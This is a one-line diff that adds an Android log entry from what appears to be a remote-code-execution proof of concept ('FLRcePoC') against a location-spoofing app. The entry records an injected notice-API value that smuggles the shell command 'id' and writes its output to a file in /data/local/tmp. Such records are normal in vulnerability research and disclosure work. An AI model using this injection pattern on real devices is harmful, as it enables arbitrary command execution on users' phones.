@@ -1,0 +1,1 @@
+11-05 15:16:45.946 I/FLRcePoC(19966): INJECT notice @ https://notice.api.fakeloc.cc:4430/Notice/getNotices -> 10000:id > /data/local/tmp/poc_notice_sh.txt 2>&1
